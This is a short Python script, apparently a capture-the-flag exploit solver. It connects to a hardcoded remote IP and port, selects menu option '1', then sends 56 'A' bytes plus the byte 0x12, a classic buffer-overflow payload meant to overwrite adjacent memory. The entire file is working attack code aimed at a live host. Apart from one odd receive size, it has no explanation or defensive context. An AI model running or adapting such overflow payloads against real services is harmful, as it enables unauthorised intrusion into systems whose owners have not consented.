import socket

# IP address and port
ip = "178.128.45.143"  # Replace with the desired IP address
port = 32621  # Replace with the desired port number

# Data to send
first = b"1\n"  # Bytes to send
second = b"A" * 56 + b'\x12'  # Bytes to send

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Connect to the server
    sock.connect((ip, port))
    print("Connected to {}:{}".format(ip, port))
    received_data = sock.recv(101024)

    # Send data
    sock.sendall(first)

    # Receive data
    received_data = sock.recv(1024)
    print("Received data:", received_data)
    sock.sendall(second)
    received_data = sock.recv(1024)
    print("Received data:", received_data)

finally:
    # Close the socket
    sock.close()

